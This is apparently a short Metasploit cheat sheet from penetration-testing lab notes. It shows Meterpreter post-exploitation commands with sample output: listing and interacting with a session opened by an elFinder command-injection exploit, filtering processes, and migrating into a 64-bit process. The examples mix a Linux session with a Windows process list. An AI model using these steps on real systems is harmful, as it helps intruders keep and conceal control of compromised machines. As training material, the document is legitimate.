# Sessions

## Session Background

```sh
meterpreter > background
```

## Session Listing

```sh
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > sessions
```

```output title="Output"
Active sessions
===============

  Id  Name  Type                   Information                Connection
  --  ----  ----                   -----------                ----------
  1         meterpreter x86/linux  www-data @ 10.129.249.194  10.10.14.229:4444 -> 10.129.249.194:57630 (10.129.249.194)
```

## Session Interaction

```sh
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > sessions -i 1
```

## Listing Running Processes

```sh
meterpreter > ps -A x64
```

```output title="Output" hl_lines="11"
Filtering on arch 'x64

Process List
============

 PID   PPID  Name            Arch  Session  User                    Path
 ---   ----  ----            ----  -------  ----                    ----
 796   1904  explorer.exe    x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 1000  924   dwm.exe         x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 1288  1536  rdpclip.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\rdpclip.exe
 1420  496   taskhost.exe    x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 1828  2308  conhost.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1912  2308  conhost.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2624  796   vmtoolsd.exe    x64   2        WINLPE-2K8\htb-student  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2696  796   cmd.exe         x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
 2732  796   powershell.exe  x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

## Migrating to a 64-bit Process

```sh
meterpreter > migrate 1420
```

```output title="Output"
[*] Migrating from 2108 to 1420...
[*] Migration completed successfully.
```
